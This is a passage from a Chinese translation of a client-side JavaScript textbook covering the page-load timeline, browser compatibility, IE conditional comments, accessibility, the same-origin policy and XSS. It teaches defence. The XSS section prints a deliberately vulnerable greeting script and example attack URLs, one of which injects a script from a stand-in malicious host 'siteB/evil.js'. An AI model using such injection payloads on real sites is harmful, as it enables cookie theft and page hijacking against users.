    else if (window.addEventListener)   // Standard event registration method，注册事件的标准方法
        window.addEventListener("load", f, false);
    else if (window.attachEvent)        // IE8 and earlier use this instead，IE8以及更早的IE版本浏览器注册事件的方法
        window.attachEvent("onload", f);
}
// Start by setting a flag that indicates that the document is not loaded yet.
// 给onload设置一个标志，用来指示文档是否载入完成
onLoad.loaded = false;
// And register a function to set the flag when the document does load.
// 注册一个函数，当文档载入完成时设置这个标志
onLoad(function() { onLoad.loaded = true; });
```

**13.3.3客户端javascript线程模型**

javascript语言核心并不包含任何线程机制，并且客户端javascript传统上也没有定义任何线程机制。html5定义了一种作为后台线程的“web worker”，但是客户端javascript还像严格的单线程一样工作。甚至当可能并发执行的时候，客户端javascript也不会知晓是否真的有并行逻辑的执行。

单线程执行是为了让编程更加简单。编写代码时可以确保两个事件处理程序不会同一时刻运行，操作文档内容时也不必担心会有其他线程试图同时修改文档，并且永远不需要在写javascript代码的时候担心锁、死锁和竞态条件（race condition）。

单线程执行意味着浏览器必须在脚本和事件句处理程序执行的时候停止响应用户输入。这为javascript程序员带来了负担，它意味着javascript脚本和事件处理程序不能运行太长时间。如果一个脚本执行计算密集的任务，它将会给文档载入带来延迟，而用户无法在脚本完成前看到文档内容。如果事件处理程序执行计算密集的任务，浏览器可能变得无法响应，可能会导致用户认为浏览器崩溃了。（某些浏览器能够防范拒绝服务攻击和偶然的无限循环，如果脚本或事件处理程序运行时间太长，它会提示用户。这就给用户一个选择中止运行脚本的机会）。

如果应用程序不得不执行太多的计算而导致明显的延迟，应该允许文档在执行这个计算之前完全载入，并确保能够告知用户计算正在进行并且浏览器没有挂起。如果可能将计算分解为离散的子任务，可以使用setTimeout()和setInterval()方法在后台运行子任务，同时更新一个进度指示器向用户显示反馈。

HTML5定义了一种并发的控制方式，叫做“Web worker”。web worker是一个用来执行计算密集任务而不冻结用户界面的后台线程。运行在web worker线程里的代码不能访问文档内容，不能和主线程或其他worker共享状态，只可以和主线程和其他worker通过异步事件进行通信，所以主线程不能检测并发性，并且web worker不能修改javascript程序的基础单线程执行模型。参见22.4节获得更多web worker的信息。

**13.3.4客户端javascript时间线**

我们已经看到了javascript程序从脚本执行阶段开始，然后切换到事件处理阶段。本节会更详细地解释了javascript程序执行的时间线。

1. web浏览器创建document对象，并且开始解析web页面，解析html元素和它们的文本内容后添加element对象和text节点到文档中。在这个阶段document.readystate属性的值是“loading”。
2. 当html解析器遇到没有async和defer属性的script元素时，它把这些元素添加到文档中，然后执行行内或外部脚本。这些脚本会同步执行，并且在脚本下载（如果需要）和执行时解析器会暂停。这样脚本就可以用document.write()来把文本插入到输入流中。解析器恢复时这些文本会成为文档的一部分。同步脚本经常简单定义函数和注册后面使用的注册事件处理程序，但它们可以遍历和操作文档树，因为在它们执行时已经存在了。这样，同步脚本可以看到它自己的script元素和它们之前的文档内容。
3. 当解析器遇到设置了async属性的script元素时，它开始下载脚本文本，并继续解析文档。脚本会在它下载完成后尽快执行，但是解析器没有停下来等它下载。异布脚本禁止使用document.write()方法。它们可以看到自己的script元素和它之前的所有文档元素，并且可能或干脆不可能访问其他的文档内容。
4. 当文档完成解析，document.readyState属性变成“interactive”。
5. 所有有defer属性的脚本，会按它们在文档里的出现顺序执行。异步脚本可能也会在这个时间执行。延迟脚本能访问完整的文档树，禁止使用document.write()方法。
6. 浏览器在document对象上触发DOMContentLoaded事件。这标志着程序执行从同步脚本执行阶段转换到了异步事件驱动阶段。但要注意，这时可能还有异步脚本没有执行完成。
7. 这时，文档已经完全解析完成，但是浏览器可能还在等待其他内容载入，如图片。当所有这些内容完成载入时，并且所有异步脚本完成载入和执行，document.readyState属性改变为“complete”，web浏览器触发window对象上的load事件。
8. 从此刻起，会调用异步事件，以异步响应用户输入事件、网络事件、计时器过期等。

这是一条理想的时间线，但是所有浏览器都没有支持它的全部细节。所有浏览器普遍都支持load事件，会触发它，它是决定文档完全载入并可以操作最通用的技术。DOMContentLoaded事件在load事件之前触发，当前所有浏览器都支持这个事件，除了IE之外，document.readyState属性在写本书时已被大部分浏览器实现，但是属性的值在浏览器之间有细微的差别。defer属性被所有当前版本的IE支持，但是现在还未被其他浏览器实现。async属性的支持在写本书时还不通用，但是例13-4里展示的异步脚本执行技术被当前所有当前浏览器支持。（但是，要注意用类似loadasync()函数动态载入脚本的能力让程序执行的脚本载入阶段和事件驱动阶段之间的界限更加模糊。）

这条时间线没有指定什么时候文档开始对用户可见或什么时候web浏览器必须开始响应用户输入事件。这些是实现细节。对于很长的文档或非常慢的网络链接，web浏览器理论上会渲染一部分文档，并且在所有脚本执行之前，就能允许用户开始和页面产生一些交互。这种情况下，用户输入事件可能在程序执行的事件驱动阶段开始之前触发。

**13.4兼容性和互用性**

web浏览器是web应用的操作系统，但是web是一个存在各种差异性的环境，web文档和应用会在不同操作系统（Windows、Mac OS、Linux、iPhone OS、Android）的不同开发商（Microsoft、Mozilla、Apple、Google、Opera）的不同时代的浏览器（从预览版的浏览器到类似IE6这种十多年之前的浏览器）上查看和运行。写一个健壮的客户端javascript程序并能正确地运行在这么多类型的平台上，的确是一种挑战。

客户端javascript兼容性和交互性的问题可以归纳为以下三类：

***演化***
web平台一直在演变和发展当中。一个标准规范会倡导一个新的特性或API。如果特性看起来有用，浏览器开发商实现它。如果足够多的开发商实现它，开发者开始试用这个特性，并依赖这个特性，然后这个特性就在web平台中广泛使用。有时候浏览器开发商和web开发者引领这种标准规范的指定，开发好官方的版本，之前该特性已经成为一个事实的标准。另一种情况，新特性已经被添加到web中，新浏览器支持它但是老浏览器不支持。web开发者必须在使用老旧浏览器的大量用户和使用新式浏览器的少量用户之间做出权衡。

***未实现***
有时候，浏览器开发商之间对于某一个特性是否足够有用到要实现存在观点上的差异。一些开发商实现了这个特性，而其他的没有实现。有些现代浏览器实现的功能在老旧浏览器中没有实现，这种情况还好，但同样实现一个功能在不同浏览器中有很大的差别，例如，IE8不支持canvas元素，虽然所有其他浏览器已经实现了它。一个更加糟糕的例子是，Microsoft决定不实现DOM Level 2 Event规范（它定义了addEventListener()和相关的方法）。这个规范在十年之前已经标准化了，其他浏览器厂商已经支持了很久了。

***bug***
每个浏览器都有bug，并且没有按照规范准确地实现所有的客户端javascriptAPI。有时候编写能兼容各个浏览器的javascript程序是一个糟糕透了的工作，必须研究已有浏览器中的各种bug。

幸运的是，javascript语言本身是被所有浏览器厂商实现的，它不是兼容性问题的源头。所有浏览器都有对ES3的通用实现，并且在写本书的时候，所有厂商都在实现ES5。ES3和ES5之间的转换可能会导致兼容性问题，因为一些浏览器会支持严格模式而其他的不支持，浏览器厂商对ES5的实现基本是相互通用的。

首先，要解决javascript的兼容性问题是要了解问题的根源是什么。web浏览器版本的更迭要比本书的版本快三倍多，因此本书没办法告诉你什么版本的浏览器实现了哪些特性，或者不会过多讨论哪些特性在某些浏览器下的表现如何或其中的bug。这些比较具体的信息最好直接去网上查找。html5标准化的努力的目标是最终产生一个测试套件。在写本书的时候，还没有这样的测试，但是一旦存在这样的测试，这必定会给浏览器兼容性领域留下一些宝贵的财富。当下有一些网站提供了这种信息，可能会对你有用：
```
https://developer.mozilla.org
Mozilla开发者中心
```

```
http://msdn.microsoft.com
Microsoft开发者网络
```

```
http://developer.apple.com/safari
Apple开发者网络里的Safari开发者中心
```

```
http://code.google.com/doctype
Google把Doctype项目介绍为“开放web的一本百科全书”。这个用户可以编辑的站点包含客户端javascript的各种兼容性表格。在写本书的时候，这些表格只报告了每个浏览器里是否存在各种属性和方法，而事实上没有说它们是否工作正常。
```

```
http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(HTML_5)
Wikipedia文章跟踪了HTML5特性和API在各个浏览器里的实现状态。
```

```
http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(Document_Object__Model)
一篇简单的文章，跟踪DOM特性的实现状态
```

```
http://a.deveria.com/caniuse
这个“何时可用......”站点跟踪重要web特性的实现状态，允许根据各种标准进行过滤，并在某个特性只剩下少量已部署的浏览器不支持时推荐使用。
```

```
http://www.quirksmode.org/dom
根据w3c标准列出的各种浏览器的dom兼容性表格
```

```
http://webdevout.net/browser-support
另一个跟踪浏览器开发商对于web标准的实现的站点
```
注意，列表的最后三个站点是由个人维护的。尽管它们是客户端javascript的先行者，但这些站点可能不会总是保持最新的。

当然，意识到浏览器之间的兼容性问题只是第一步。接下来，你需要解决这些不兼容性。一种策略是限制自己使用你选择支持的所有浏览器都普遍支持的特性（或者很容易模拟出的特性）。之前提及的“何时可用......”这个网站（http://a.deveria.com/caniuse）就是围绕这个策略的：它列出了所有等IE6淘汰之后才能用到的新特性，等IE6淘汰之后，这个网站也没有存在的必要的了。下面几节介绍一种略有点消极的对付客户端不兼容性问题的策略。

**13.4.1处理兼容性问题的类库**

处理不兼容问题其中一种最简单的方法是使用类库。比如，考虑客户端图像的canvas元素（第21章的主题）。IE是唯一不支持这个特性的当前浏览器。它支持一种晦涩的客户端图形语言，叫做VML，尽管如此，canvas元素可以基于它进行模拟。开源的“explorercanvas”项目在[http://code.google.com/p/explorercanvas](http://code.google.com/p/explorercanvas)上已经发布了一个类库，就是做这件事情：引入一个javascript代码文件叫做excanvas.js，然后IE就会看起来像它支持canvas元素一样。

excanvas.js是一个兼容类库的很纯粹的例子。在开发过程中，可能会对某个特性编写类似的类库。ES5数组方法（见7.9节），比如forEach()、map()和reduce()，可以在ES3中几乎完美模拟，并且通过把合适的类库添加到页面中，可以把这些强大有用的方法当做所有浏览器平台基线的部分。

但是，有时候，不可能完全地（或有效地）在一个不支持某个特性的浏览器上实现一个特性。就像已经提到的，IE是唯一没有实现标准事件处理API的浏览器，包括注册事件处理程序的addEventListener()方法。IE支持一个类似的方法叫做attachEvent()。attachEvent()不像addEventListener()一样强大，并且在IE提供的基础上透明地实现整个标准并非真正可行。反之，开发者有时定义一个折中的事件处理方法，通常叫addEvent()，它可以用addEventListener()或attachEvent()来方便地实现绑定事件的功能。然后，它们在所有的代码里用addEvent()来代替addEventListener()或attachEvent()。

在实际的开发工作中，今天不少web开发者在它们所有的web页面上用了客户端javascript框架，比如jQuery（参见第19章）。使这些框架必不可少的一个重要功能是：它们定义了新的客户端API并兼容所有浏览器。例如，在jQuery里，事件处理程序的注册是通过bind()的方法完成的。如果你基于jQuery做所有的web开发，你就永远不需要考虑addEventListener()和attachEvent()之间的不兼容性问题。参见13.7节获得更多关于客户端框架的信息。

**13.4.2分级浏览器支持**

分级浏览器（graded browser support）是由Yahoo!率先提出的一种测试技术。从某种维度对浏览器厂商/版本/操作系统变体进行分级。分级浏览器中的A级要通过所有的功能测试用例。对于C级浏览器来说则不必所有用例都通过测试。A级浏览器需要网页完全可用，C级浏览器只需在HTML完整情况下可用即可，而不需要javascript和css都正常工作。那些不是A级和C级的浏览器都称做X级浏览器：这部分都是全新的浏览器或者太罕见的浏览器。我们默认在这些浏览器中都是网页完全可用的，但官方并不会对X级浏览器中的功能提供完整支持的测试。

你可以在[http://developer.yahoo.com/yui/articles/gbs](http://developer.yahoo.com/yui/articles/gbs)阅读更多关于Yahoo!的分级浏览器支持情况。这个页面还存有Yahoo!当前的A级和C级浏览器列表（这个列表每季度更新一次，根据2011年第四季度的统计，Yahoo!已经不再将浏览器划分为A级和C
级，而是统一给出一个测试基准，根据这次更新，可以明显感觉到测试基准向移动终端倾斜）。就算自己没有采用任何一种分级浏览器测试基准，使用Yahoo!的A级浏览器列表是一种简单快捷的办法，通过查阅这个列表也能清楚地知道当前比较流行的浏览器是哪些。

**13.4.3 功能测试**

功能测试（capability testing）是解决不兼容性问题的一种强大的技术。如果你想试用某个功能，但又不清楚这个功能是否在所有的浏览器中都有比较好的兼容性，则需要在脚本中添加相应的代码来检测是否在浏览器中支持该功能。如果期望使用的功能还没有被当前平台所支持，要么不在该平台中使用它，要么提供可在所有平台上运行的代码。

你将会在后面的各章中一次又一次地看到功能测试。例如，在第17章，有如下所示的代码：
```javascript
if (element.addEventListener) { //在使用这个W3C方法之前首先检测它是否可用
    element.addEventListener("keydown", handler, false);
    element.addEventListener("keypress", handler, false);
}
else if (element.attachEvent) { //在使用该IE方法之前首先检测它
    element.attachEvent("onkeydown", handler);
    element.attachEvent("onkeypress", handler);
}
else { //否则，选择普遍支持的技术
    element.onkeydown = element.onkeypress = handler;
}
```
关于功能测试最重要的是，它并不涉及浏览器开发商和浏览器的版本号。代码在当前的浏览器集合中有效，在浏览器的后续版本中也同样有效，而不管后续的浏览器是否实现了这些功能的集合。但要注意的是，这种方法需要测试某个属性或方法是否在浏览器中已经定义，除非该属性或方法完全有用。如果
Microsoft要定义一个addEventListener()方法，但Microsoft只是实现了一部分W3C规范，在调用addEventListener()之前这将会给使用特性测试的代码带来很多麻烦。

**13.4.4怪异模式和标准模式**

Microsoft在发布IE6的时候，增加了IE5里没有的很多css标准特性。但为了确保与已有web内容的后向兼容性，它定义了两种不同的渲染模式。在“标准模式”或“css兼容模式”中，浏览器要遵循css标准，在“怪异模式”中，浏览器表现的和IE4和iE5中怪异非标准模式一样。渲染模式的选择依赖于html文件顶部的DOCTYPE声明，在IE6中打开没有DOCTYPE的页面和声明了某些权限Doctype的页面都会按照怪异模式进行渲染，定义了严格的Doctype的页面（或者为了做到前向兼容性而添加了未知的Doctype的页面）会按照标准模式进行渲染，定义了html5 Doctype （<!DOCTYPE html>）的页面在所有现代浏览器中都会按照标准模式渲染。

怪异模式和标准模式之间的差别经历了很长时间的发展历程，现在新版本的IE都支持标准模式，其他主流浏览器也都支持标准模式。这两种模式都已经被HTML5规范所认可。怪异模式和标准模式之间的差异对于html和css开发者影响最大。但客户端javascript代码则是需要知道文档以哪种模式进行渲染的。要进行这种渲染模式的特性检测，通常检查document.compatMode属性。如果其值为“CSS1Compat”，则说明浏览器工作在标准模式；如果值为“BackCompat”（或undefined，说明属性根本不存在），则说明浏览器工作在怪异模式。所有现代浏览器都实现了compatMode属性，并且html5规范对它进行了标准化。

测试compatMode不是必要的。但是，在例15-8展示的示例代码中用到了它。

**13.4.5 浏览器测试**

功能测试非常适用于检测大型功能领域的支持，比如可以使用这种方法来确定浏览器是否支持W3C事件处理模型还是IE的事件处理模型。另外，有时候可能会需要在某种浏览器中解决个别的bug或难题，但却没有太好的方法来检测bug的存在性。在这种情况下，需要创建一个针对某个平台的解决方案，这个解决方案和特定的浏览器厂商、版本或操作系统（或三方面的组合）联系紧密。

在客户端javascript中检测浏览器类型或版本的方法就是使用Navigator对象，我们将在第14章学习它，确定当前浏览器厂商和版本的代码通常叫做浏览器嗅探器（browser sniffer）或者客户端嗅探器（client sniffer）。例14-3给出了一个简单的例子。在web的早期，当Netscape和IE平台两者互不兼容的时候，客户端嗅探（client sniffer）就是一种常见的客户端编程技术，现在兼容性情况已经基本稳定，浏览器嗅探不像若干年前这样常用，但偶尔有些场景还会用到。

需要注意的是，客户端嗅探也可以在服务器端完成，web服务器根据User-Agent头部可以有选择地返回特定的javascript代码给客户端。

**13.4.6Internet Explorer里的条件注释**

实际上，读者会发现客户端javascript编程中的很多不兼容性都是针对IE的。也就是说，必须按照某种方式为IE编写代码，而按照另一种方式为其他浏览器编写代码。IE支持条件注释（由IE5引入），尽管这种做法并不符合标准规范，但是在处理不兼容性时非常有用。

下面是html中的条件注释的样子，注意，html注释使用结束的分隔符的技巧：
```html
<!--[if IE 6]>
This content is actually inside an HTML comment.
It will only be displayed in IE6
<![endif]-->
<!--[if lte IE'7]>
This content will only be displayed by IE5,6and7 and earlier.
lte stands for "less than or equal". You can also use "lt","gt"and"gte".
<![endif]-->
<!--[if !IE]><-->
This is normal HTML content, but IE will not display it.
because of the comment above and the comment below.
<!--><![endif]-->
This is normal content, displayed by all browsers.
```
来看一个具体的例子，上文介绍过使用canvas.js类库在Internet Explorer里实现canvas元素。由于这个类库只有IE需要（并且也只为IE工作），因此有理由在页面里使用条件注释引入它，这样其他浏览器就不会载入它：
```html
<!--[if IE]><script src="excanvas.js"></script><![endif]-->
```
```
IE的javascript解释器也支持条件注释，C和C++程序员可能觉得它们和C与预处理器的#ifdef/#endif功能很相似。IE中的javascript条件注释以文本/*@cc_on开头，以文本@*/结束，（cc_on stands中cc表示条件编译）。下面的条件注释包含了只在IE中执行的代码：
```
```
/*@cc_on
  @if(@_jscript)
  //该代码位于一条js注释内但在IE中执行它
  alert("In IE");
  @end
  @*/
```
```
在一条条件注释内部，关键字@if、@else和@end划分出哪些是要被IE的javascript解释器有条件地执行的代码。大多数时候，只需上面所示的简单条件：@if(@_jscript)。JScript是Microsoft自己的javascript解释器的名字，而@_jscript变量在IE中总是为true。
```
通过条件注释和常规的javascript注释的合理的交叉组合：可以设置在IE中运行一段代码而在所有其他浏览器中运行另一段不同的代码：
```
/*@cc_on
  @if (@_jscript)
  //这里的代码在一条条件注释中，也在一条常规的javascript注释中
  //IE会执行这段代码，其他浏览器不执行它
  @else*/
    //这段代码并没在javascript注释中，但仍然在IE条件注释中
    //也就是说除了IE之外的所有浏览器都执行这里的代码
    alert('You are not using Internet Explorer');
/*@end
  @*/
```


**13.5可访问性**

web是发布信息的理想工具，而javascript可以增强对信息的访问。然而，javascript程序员必须小心，因为程序员写代码太过随意，以至于那些有视觉障碍或者肢体困难的用户没办法正确的获取信息。

盲人用户使用一种叫做屏幕阅读器的“辅助性技术”将书面的文字变成语音词汇。有些屏幕阅读器是识别javascript的，而另一些只能在禁用javascript时才会工作得更好。如果你设计的站点过于依赖javascript来呈现数据的话，就会把那些使用读萍软件的用户拒之门外。（当然也会把那些使用像手机这样不支持javascript的移动设备的用户以及那些有意禁用浏览器脚本的用户排除在外。）javascript可访问性的一条重要原则是，设计的代码即使在禁用javascript解释器的浏览器中也能正常使用（或至少以某种形式正常使用）。

可访问性关心的另一个重要的问题是，对于那些只使用键盘但不能（或者选择不用）使用鼠标的用户来说，如果编写的javascript代码依赖于特定的鼠标事件，这就会将那些不使用鼠标的用户排除在外。web浏览器允许使用键盘来遍历和激活一个web页面中的UI元素。并且javascript代码也应该允许这样做。正如17章所介绍的，javascript支持独立于设备的事件，例如onfocus和onchange，以及依赖于设备的事件（比如onmouseover和onmousedown）。为了考虑到可访问性，应该尽可能地支持独立于设备的事件。

创建可访问性的web页面并非鸡毛蒜皮的小问题，而对于可访问性的完整讨论则超出了本书的范畴。关于可访问性的web应用开发者应该阅读这里的文档：
```
http:www.w3.org/WAI/intro/aria的WAI-ARIA（Web Accessibility Initiative-Accessible Rich Internet Applications）标准。
```

**13.6安全性**

web浏览器中包含javascript解释器，也就是说，一旦载入web页面，就可以让任意的javascript代码在计算机里执行。很明显，这里存在着安全隐患，浏览器厂商也在不断地权衡下面这两个方面之间的博奕：

* 定义强大的客户端API，启用强大的web应用
* 阻止恶意代码读取或修改数据、盗取隐私、诈骗或浪费时间

就像在其他领域中一样，javascript也在盘根错节的安全漏洞和补丁之间不断地发展演化。在web早期，浏览器添加了类似能够打开、移动、调整窗口大小以及编辑浏览器状态栏的功能。而当不道德的广告商和骗子开始滥用这些技术，浏览器制作者不得不限制或禁用这些API。今天，在标准化HTML5的进程中，浏览器厂商会小心（并且开放和合作性地）掂量某个长期存在的安全限制，并且在（希望）不引入新的安全漏洞的基础上给客户端javascript添加少量的功能。
下面几节会介绍javascript的安全限制和安全问题，这些问题是每个web开发者都需要意识到的。

**13.6.1javascript不能做什么**

web浏览器针对恶意代码的第一条防线就是它们不支持某些功能。例如，客户端javascript没有权限来写入或删除客户计算机上的任意文件或列出任意目录。这意味着javascript程序不能删除数据或植入病毒。（但22.6.5节会介绍javascript如何阅读用户选择的文件，22.7节介绍javascript如何实现安全隐私文件系统，以及如何读取和写入文件。）

类似地，客户端javascript没有任何通用的网络能力。客户端javascript程序可以对http协议编程（参见第18章）；并且html5有一个复附属标准叫WebSockets，定义了一个类套接字的API，用于和指定的服务器通信。但是，这些API都不允许对于范围更广的网络进行直接访问。通用的Internet客户端和服务器不能同时使用客户端javascript来写。作者在这里的提示非常重要，我们不能基于浏览器写出一个“服务器”，网络中的浏览器和浏览器之间是无法直接进行通信的。

浏览器针对恶意代码的第二条防线是在自己支持的某些功能上施加限制。以下是一些功能限制：

* javascript程序可以打开一个新的浏览器窗口，但是为了防止广告商滥用弹出窗口，很多浏览器限制了这一功能，使得只有为了响应鼠标单击这样的用户触发事件的时候，才能使用它。
* javascript程序可以关闭自己打开的浏览器窗口，但是不允许它不经过用户确认就关闭其他的窗口。
* HTML FileUpload元素的value属性是只读的。如果可以设置这个属性，脚本就能设置它为任意期望的文件名，从而导致表单上传指定文件（比如密码文件）的内容到服务器。
* 脚本不能读取从不同服务器（严格讲这些服务器来自不同的域、端口或协议，更详细内容请参照13.6.2。）载入的文档的内容，除非这个就是包含该脚本的文档。类似地，一个脚本不能在来自不同服务器的文档上注册事件监听器。这就防止脚本窃取其他页面的用户输入（例如，组成一个密码项的键盘单击过程）。这一限制叫做同源策略（same-origin policy），下一节将更详细地介绍它。

注意，这里未给出所有的客户端javascript的限制项，不同浏览器有不同的安全策略，并可能实现不同的API限制。部分浏览器可能还允许根据用户偏好来增强或减弱限制。 

**13.6.2同源策略**

同源策略是对javascript代码能够操作哪些web内容的一条完整的安全限制。当web页面使用多个iframe元素或者打开其他浏览器窗口的时候，这一策略通常就会发挥作用。在这种情况下，同源策略负责管理窗口或窗体中的javascript代码以及和其他窗口或帧的交互。具体来说，脚本只能读取和所属文档来源相同的窗口和文档的属性（参见14.8节了解如何使用javascript操控多个窗口和窗体）。

文档的来源包含协议、主机，以及载入文档的URL端口。从不同web服务器载入的文档具有不同的来源。通过同一主机的不同端口载入的文档具有不同的来源。使用http:协议载入的文档和使用https:协议载入文档具有不同的来源，即使它们来自同一个服务器。

脚本本身的来源和同源策略并不相关，相关的是脚本所嵌入的文档的来源，理解这一点很重要。例如，假设这一来自主机A的脚本被包含到（使用script标记的src属性）宿主B的一个web页面。这个脚本的来源是主机B，并且可以完整地访问包含它的文档的内容。如果脚本打开一个新窗口并载入来自主机B的另一个文档，脚本对这个文档的内容也具有完全的访问权限。但是，如果脚本打开第三个窗口并载入一个来自主机C的文档（或者是来自主机A），同源策略就会发挥作用，阻止脚本访问这个文档。
实际上，同源策略并非应用于不同源的窗口中的所有对象的所有属性。不过它应用到了其中的大多数属性，尤其是对Document对象的几乎所有属性而言。凡是包含另一个服务器中文档的窗口或窗体，都是同源策略适用的范围。如果脚本打开一个窗口，脚本也可以关闭它，但不能以任何方式查看窗口内部。同源策略还应用于使用XMLHttpRequest生成的HTTP请求（参见第18章）。这个对象允许客户端javascript生成任意的HTTP请求到脚本所属文档的web服务器，但是不允许脚本和其他web服务器通信。

对于防止脚本窃取似有的信息来说，同源策略是必需的。如果没有这一限制，恶意脚本（通过防火墙载入到安全的公司内网的浏览器中）可能打开一个空的窗口，欺骗用户进入并使用这个窗口在内网上浏览文件。恶意脚本就能够读取窗口的内容并将其发送回自己的服务器。同源策略防止了这种行为。

**不严格的同源策略**

在某些情况下，同源策略就显得太过严格了。本节会介绍三种不严格的同源策略。

同源策略给那些使用多个子域的大站点带来了一些问题。例如，来自home.example.com的文档里的脚本想要合法地读取从developer.example.com载入的文档的属性，或者来自orders.example.com的脚本可能需要读catalog.example.com上的文档的属性。为了支持这种类型的多域名站点，可以使用Document对象的domain属性。在默认情况下，属性domain存放的是载入文档的服务器的主机名。可以设置一些属性，不过使用的字符串必须具有有效的域前缀或它本身。因此，如果一个domain属性的初始值是字符串“home.example.com”，就可以把它设置为字符串“example.com”，但是不能设置为“home.example”或“ample.com”。另外，domain值中必须有一个点号，不能把它设置为“com”或其他顶级域名。

如果两个窗口（或窗体）包含的脚本把domain设置成了相同的值，那么这两个窗口就不再受同源策略的约束，它们可以相互读取对方的属性。例如，从order.example.com和catalog.example.com载入的文档中的脚本可以把它们的document.domain属性都设置为“example.com”，这样一来，这些文档就有了同源性，可以互相读取属性。

不严格的同源策略的第二项技术已经标准化为：跨域资源共享（Cross-Origin Resource Sharing，参见http://www.w3.org/TR/cors/）。这个标准草案用新的“origin:”请求头和新的Access-Control-Allow-Origin响应头来扩展HTTP。它允许服务器用头信息显式地列出源，或使用通配符来匹配所有的源并允许由任何地址请求文件。类似Firefox3.5和Safari4的浏览器可以使用这种新的头信息来允许跨域HTTP请求，这样XMLHttpRequest就不会被同源策略所限制了。

另一种新技术，叫做跨域文档消息（cross-document-messaging），允许来自一个文档的脚本可以传递文本消息到另一个文档里的脚本，而不管脚本的来源是否不同。调用Window对象上的postMessage()方法，可以异步传递消息事件（可以用onmessage事件句处理程序函数来处理它）到窗口的文档里。一个文档里的脚本还是不能调用在其他文档里的方法和读取属性，但它们可以用这种消息传递技术来实现安全的通信。参见22.3节获取更多关于跨文档消息API的细节。

**13.6.3脚本化插件和ActiveX控件**

尽管核心javascript语言和基本的客户端对象模型缺乏大多数恶意代码所需要的文件系统功能和网络功能，但情况并不像看上去那么简单。在很多web浏览器中，javascript亦被用做很多软件或插件的“脚本引擎”，这样的组件有IE中的ActiveX控件和其他浏览器的插件。Flash和Java插件是最常安装的例子，它们为客户端脚本提供了非常重要且强大的特性。

脚本化ActiveX控件和插件的能力也存在着安全性的问题。例如，Java-applet具有访问底层网络的能力。Java安全“沙箱”阻止applet和载入它的服务器之外的任何服务器进行通信，因此，这并未打开一个安全漏洞。但是，它暴露了一个根本的问题：如果插件是可以脚本化的，我们不仅要无条件相信web浏览器的安全架构，还要相信插件的安全架构。实际上，Java和Flash插件看上去具有健壮的安全性，并且不会为客户端javascript引来安全问题。然而ActiveX脚本化有着更糟糕的历史遗留问题。IE浏览器已经能够访问各种各样的脚本化ActiveX控件，而这些控件是windows操作系统的一部分，并且在过去，操作系统还存在很多可被控件利用的安全漏洞。

**13.6.4跨站脚本**

跨站脚本（Cross-site-scripting），或者叫做XSS，这个术语用来表示一类安全问题，也就是攻击者向目标web站点注入HTML标签或者脚本。防止XSS攻击是服务器端web开发者的一项基本工作。然而，客户端javascript程序员也必须意识到或者能够预防跨站脚本。

如果web页面动态地产生文档内容，并且这些文档内容是基于用户提交的数据的，而并没有通过从中移除任何嵌入的HTMl标签来“消毒”的话，那么这个web页面很容易遭到跨站脚本攻击。来看一个小例子，考虑如下的web页面，它使用javascript通过用户的名字来向用户问好：
```
<script>
var name = decodeURIComponent(window.location.search.substring(1))||"";
document.write("Hello " + name);
</script>
```
这两行脚本使用window.location.search来获得它们自己的URL中以"?"开始的部分。它使用document.write()来向文档添加动态生成的内容。这个页面专门通过如下的一个URL来调用：
```
http://www.example.com/greet.html?David
```
这么使用的时候，它会显示文本“Hello David”。但考虑一下，当用下面的URL来调用它，会发生什么情况：
```
http://www.example.com/greet.html?%3Cscript%3Elalert('David')%3C/script%3E
```
只用这个URL，脚本会动态地生成另一个脚本（%3C和%3E是一个尖括号的编码）。在这个例子中，注入的脚本只显示一个对话框，这还是相对较好的情况。但是，如果考虑以下的情况：
```
http://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
```
之所以叫跨站脚本攻击，就是因为它涉及多个站点。站点B（或者站点C）包含一个专门构造的到站点A的链接（就像上面那个），它会注入一个来自站点B的脚本。脚本eval.js驻留在恶意站点B中，但现在，它嵌入到站点A中，并且可以对站点A的内容进行任何想要的操作。它可能破坏这个页面或者使其不能正常工作（例如，启动下一节所要介绍的拒绝服务攻击）。这可能会对站点A的用户带来不少坏处。更危险的是，恶意脚本可以读取站点A所存储的cookie（可能是统计数据或者其他个人验证信息），然后把数据发送回站点B。注入的脚本甚至可以诱骗用户击键并将数据发送回站点B。

通常，防止XSS攻击的方式是，在使用任何不可信的数据来动态的创建文档内容之前，从中移除HTML标签。可以通过添加如下一行代码来移除script标签两边的尖括号，从而修复前面给出的greet.html文件。
```javascript
name = name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
```
上面的简单代码替换把字符串中所有的尖括号替换成它们所对应的HTML实体，也就是说将字符串中任意HTML标签进行转义和过滤删除（deactivate）处理。IE8定义了一个更加微妙的toStaticHTML()方法，可以移除script标签（和其他潜在的可执行内容）而不修改不可执行的HTML。toStaticHTML()是不标准的，但在Javascript核心代码中自己实现一个HTML安全函数也非常简单。

HTML5的内容安全策略则更进一步，它为iframe元素定义了一个sandbox属性。在实现之后，它允许显示不可信的内容，并自动禁用脚本。

跨站脚本使得一个有害的漏洞能够立足于web的架构之中。深入理解这些跨站脚本的知识是值得的，但是更深入的讨论超出了本书的范围。有很多在线资源可以帮助你预防跨站脚本带来的危险。其中一个最重要的参考资料出自原始CERT Advisory：http://www.cert.org/advisories/CA-2000-02.html。

**13.6.5拒绝服务攻击**

这里描述的同源策略和其他的安全限制可以很好地预防恶意代码毁坏数据或者防止侵犯隐私这种问题。然而，它们并不能防止另外一种攻击：拒绝服务攻击，这种攻击手法非常暴力。如果访问了启用javascript功能的一个恶意web站点，这个站点可以使用一个alert()对话框的无循环占用浏览器，或者用一个无限循环或没有意义的计算来占用CPU。

某些浏览器可以检测运行时间很长的脚本，并且让用户选择终止它们。但是恶意脚本可以使用window.setInterval()这样的方法来占用CPU，并通过分配很多的内存来攻击你的系统。web浏览器并没有通用的方法来防止这种笨重的攻击手法。实际上，由于没有人会返回一个滥用这种脚本的网站，因此这在web上不是一个常见的问题。

**13.7客户端框架**

一些web开发者发现基于客户端框架或类库来创建它们的web应用非常便捷。从某种意义上讲类库也是框架，它们对web浏览器提供的标准和专用的API进行了封装，向上提供了更高级别的API，用以更高效地进行客户端编程开发。一旦使用一个框架，就要用框架定义的API来写代码，使用框架的一个明显的好处是高级的API可以用更简洁的代码完成更复杂的功能。此外，完善的框架也会帮我们处理上文提到的很多兼容性、安全性和可访问性问题。

